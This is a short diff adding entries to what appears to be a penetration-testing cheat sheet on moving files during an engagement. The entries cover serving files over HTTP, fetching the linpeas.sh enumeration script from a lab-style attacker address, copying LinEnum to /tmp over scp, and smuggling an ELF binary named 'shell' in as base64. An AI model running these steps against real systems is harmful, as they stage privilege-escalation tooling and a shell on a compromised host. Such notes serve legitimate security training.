@@ -1,0 +1,6 @@
+- `python3 -m http.server 8000` – Start HTTP server  
+- `wget http://10.10.14.1:8000/linpeas.sh` – Download via wget  
+- `scp linenum.sh user@remotehost:/tmp/linenum.sh` – Upload via SCP  
+- `base64 shell -w 0` – Encode file  
+- `echo f0VMR... | base64 -d > shell` – Decode file  
+- `md5sum shell` – Check file hash  
